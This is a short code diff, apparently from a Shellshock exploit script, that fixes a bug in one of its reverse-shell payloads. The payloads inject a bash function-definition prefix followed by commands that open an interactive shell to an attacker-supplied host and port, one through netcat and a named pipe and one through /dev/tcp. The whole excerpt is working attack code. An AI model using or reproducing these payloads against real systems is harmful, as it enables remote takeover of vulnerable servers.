@@ -17,7 +17,7 @@ def main(args):
 	elif args.shell == 'nc':
 		reverse_shell="() { ignored;};/bin/bash -c '/bin/rm -f /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l %s %s > /tmp/f'" %(args.remote, args.port)
 	elif args.shell == 'dev_tcp':
-		reverse_shell="() { ignored;};/bin/bash -i >& /dev/tcp/%s%s 0>&1" % (args.remote, args.port)
+		reverse_shell="() { ignored;};/bin/bash -i >& /dev/tcp/%s/%s 0>&1" % (args.remote, args.port)
 
 	print "We will use the following shell: " + reverse_shell
 
